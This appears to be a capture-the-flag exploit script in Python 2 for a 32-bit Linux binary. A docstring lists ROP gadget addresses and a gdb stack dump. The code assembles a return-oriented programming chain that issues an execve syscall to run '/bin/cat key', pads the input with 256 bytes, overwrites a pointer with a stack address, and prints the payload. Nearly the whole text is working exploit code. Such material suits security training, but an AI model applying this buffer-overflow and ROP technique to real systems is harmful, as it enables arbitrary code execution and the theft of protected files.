"""
name @ 0xbffffad4

80499a6:	83 c4 18             	add    $0x18,%esp
80499a9:	5b                   	pop    %ebx
80499aa:	c3                   	ret

809a92a:	58                   	pop    %eax
809a92b:	5b                   	pop    %ebx
809a92c:	5e                   	pop    %esi
809a92d:	5f                   	pop    %edi
809a92e:	c3                   	ret 
 
8061a4c:       5a                      pop    %edx
8061a4d:       59                      pop    %ecx
8061a4e:       5b                      pop    %ebx
8061a4f:       c3                      ret  

8066f6e:       cd 80                   int    $0x80

0xbffffac0:	0x080b4e14	0xbffffbd4	0x080d69c0	0x00000000
0xbffffad0:	0x00000000	0x41414141	0x2031000a	0x00021000
0xbffffae0:	0x00021000	0x00000003	0x00000028	0x080dde30
0xbffffaf0:	0x00000003	0x00000014	0x00000000	0x080dde01
0xbffffb00:	0x00000137	0x000009c8	0x080dde30	0x0000005e
0xbffffb10:	0x000009b0	0x08100cd0	0x080dde38	0x080dde00
0xbffffb20:	0x000009b8	0xbffffb40	0x0805edb0	0x080dde00
0xbffffb30:	0x00000002	0x080dfcd8	0x080dde00	0x000009b0
"""

import struct
from subprocess import *
import sys

name = 0xbffffad4+32	#offset 32 diff caused by gdb
JUNK = 0xdeffbeef

rop = [
	0x080499a6,	#add esp 18, pop, ret
	0x0809a92a,	#pop4 ret
	0x0000000b,	#syscall 11
	JUNK,		#NULL
	JUNK,		#NULL
	JUNK,		#NULL
	0x08061a4c,	#pop3 ret ||to clear out ecx and edx :(
	name+4*0xd,	#edx
	name+4*0xf,	#ecx
	name+4*0xb,	#ebx
	0x08066f6e,	#int	0x80
	0x6e69622f,	#/bin
	0x7461632f,	#/cat
	0x00000000,
	0x0079656b,	#key
	name+4*0xb,
	name+4*0xe,
	0x00000000,
]

payload = ""
for r in rop:
	payload += struct.pack("<I", r)

payload += "\n2\nA\n"
payload += "A"*256
payload += struct.pack("<I", name) #0xbffffad4
payload += "\nA\n"

print payload

